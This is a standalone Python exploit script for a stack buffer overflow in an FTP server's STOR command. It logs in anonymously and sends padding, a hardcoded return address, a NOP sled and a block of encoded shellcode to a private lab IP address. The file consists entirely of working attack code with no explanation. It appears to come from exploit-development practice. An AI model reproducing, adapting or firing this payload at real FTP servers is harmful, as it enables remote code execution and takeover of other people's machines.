#!/usr/bin/python

import socket
import sys

buf =  b""
buf += b"\xbd\xee\x15\x19\x46\xd9\xeb\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x59\x83\xc6\x04\x31\x6e\x10\x03\x6e\x10\x0c"
buf += b"\xe0\xe5\xae\x5f\x0b\x16\x2f\x3f\x3d\xc4\x4b\x34\x6f"
buf += b"\xd8\x18\x18\x9c\x91\xfa\x17\xce\xb5\x35\xd8\x64\xc7"
buf += b"\x1d\x29\xcc\x62\x78\x04\xf2\xdf\xb8\x07\x8e\x1d\xed"
buf += b"\xe7\xaf\xed\xe0\xe6\xe8\xbb\x8f\x07\xa4\xb0\x22\xc7"
buf += b"\xc2\x85\xfe\xe6\x04\x5e\x74\xa8\xdc\xe4\x4a\x5c\x51"
buf += b"\xe6\x9a\x17\x21\xf0\x91\x7f\x92\x50\xa7\xac\x57\x99"
buf += b"\xd3\x6e\x69\xe5\x55\x05\xbd\x92\x67\xcf\x8f\x64\xcb"
buf += b"\x2e\x20\x69\x15\x77\x87\x92\x60\x83\xfb\x2f\x73\x50"
buf += b"\x81\xeb\xf6\x46\x21\x7f\xa0\xa2\xd3\xac\x37\x21\xdf"
buf += b"\x19\x33\x6d\xfc\x9c\x90\x06\xf8\x15\x17\xc8\x88\x6e"
buf += b"\x3c\xcc\xd1\x35\x5d\x55\xbc\x98\x62\x85\x18\x44\xc7"
buf += b"\xce\x8b\x93\x77\x2f\x54\x9c\x25\xa7\x98\x51\xd6\x37"
buf += b"\xb7\xe2\xa5\x05\x18\x59\x22\x25\xd1\x47\xb5\x3c\xf5"
buf += b"\x77\x69\x86\x96\x89\x8a\xf6\xbf\x4d\xde\xa6\xd7\x64"
buf += b"\x5f\x2d\x28\x88\x8a\xdb\x22\x1e\xf5\xb3\x78\x5d\x9d"
buf += b"\xc1\x7e\x70\x02\x4c\x98\x22\xea\x1e\x35\x83\x5a\xde"
buf += b"\xe5\x6b\xb1\xd1\xda\x8c\xba\x38\x73\x26\x55\x94\x2b"
buf += b"\xdf\xcc\xbd\xa0\x7e\x10\x68\xcd\x41\x9a\x98\x31\x0f"
buf += b"\x6b\xe9\x21\x78\x0c\x11\xba\x79\xb9\x11\xd0\x7d\x6b"
buf += b"\x46\x4c\x7c\x4a\xa0\xd3\x7f\xb9\xb3\x14\x7f\x3c\x85"
buf += b"\x6f\xb6\xaa\xa9\x07\xb7\x3a\x29\xd8\xe1\x50\x29\xb0"
buf += b"\x55\x01\x7a\xa5\x99\x9c\xef\x76\x0c\x1f\x59\x2a\x87"
buf += b"\x77\x67\x15\xef\xd7\x98\x70\x73\x1f\x66\x06\x5c\xb8"
buf += b"\x0e\xf8\xdc\x38\xce\x92\xdc\x68\xa6\x69\xf2\x87\x06"
buf += b"\x91\xd9\xcf\x0e\x18\x8c\xa2\xaf\x1d\x85\x63\x71\x1d"
buf += b"\x2a\xb8\x82\x64\x43\x3f\x63\x99\x4d\x24\x64\x99\x71"
buf += b"\x5a\x59\x4f\x48\x28\x9c\x53\xef\x23\xab\xf6\x46\xae"
buf += b"\xd3\xa5\x99\xfb"

shellcode = '\x90'*20 + buf
payload = "A"*247+"\xF6\xC1\xB3\x7C"+ shellcode +"C"*(749-len(shellcode))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connect = s.connect(('192.168.75.132',21))

s.recv(1024)
s.send('USER anonymous\r\n')

s.recv(1024)
s.send('PASS anonymous\r\n')

s.recv(1024)
s.send('STOR' + payload + '\r\n')

s.recv(1024)
s.send('QUIT\r\n')

s.close()